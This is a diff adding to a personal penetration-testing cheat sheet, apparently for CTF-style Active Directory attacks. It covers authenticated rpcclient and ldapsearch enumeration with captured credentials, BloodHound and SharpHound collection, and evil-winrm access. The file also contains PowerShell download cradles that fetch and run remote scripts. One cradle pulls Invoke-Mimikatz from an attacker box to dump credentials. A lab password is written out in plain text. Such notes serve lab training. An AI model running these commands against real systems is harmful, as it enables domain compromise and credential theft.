@@ -237,12 +237,22 @@ rpc client enum
 
 rpcclient -U "" 10.10.175.103
 
+if you are able to get anonymous authentication into some service but no other lead, you must try that service enumeration with the login credential you got later 
+
+rpcclient -c querydispinfo -U'lparker'%'REDACTED' '10.10.117.176' 2>&1
+
+
+
 
 
 
 ldap search 
 
 ldapsearch -x -h 10.10.111.177 -b base namingcontext
+
+if you are able to get anonymous authentication into some service using some tool but no other lead, you must try that service enumeration with the login credential with same tool later when you must have got some login creds
+
+ldapsearch -x -h fusion.corp -D 'lparker@fusion.corp' -w 'passwd' -b 'dc=fusion,dc=corp' | tee recon/ldapsearch-creds.txt | more
 
 
 
@@ -288,9 +298,31 @@ or you can download from github
 
 python3 ~/Desktop/git/BloodHound.py/bloodhound.py -c All,LoggedOn -u "t-skid" -p "tj072889*" -d VULNNET-RST.LOCAL -ns 10.10.111.177
 
-
+IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/BloodHound.ps1’) ; Invoke-BloodHound
 
 
 
 powershell -exec bypass -command "IEX (New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+
+. .\Sharphound.ps1
+SharpHound.exe --CollectionMethod All
+SharpHound.exe --CollectionMethod Session --Loop
+SharpHound.exe --CollectionMethod Session --Loop --Loopduration 03:09:41
+
+
+
+
+
+
+EVIL-WINRM
+
+evil-winrm -i x.x.x.x -u user -p pass -s /pathtoscript/
+Load SharpHound.ps1
+Menu
+(goto path you can write to)
+Invoke-BloodHound -Domain HTB -LDAPUser #User -LDAPPass #Pass -CollectionMethod All -DomainController xxx -ZipFileName test.zip
+
+BLOODHOUND-PYTHON
+
+bloodhound-python -v -u xxx -p xxx -ns x.x.x.x -d htb.local -gc x.x.x.x -c All
 
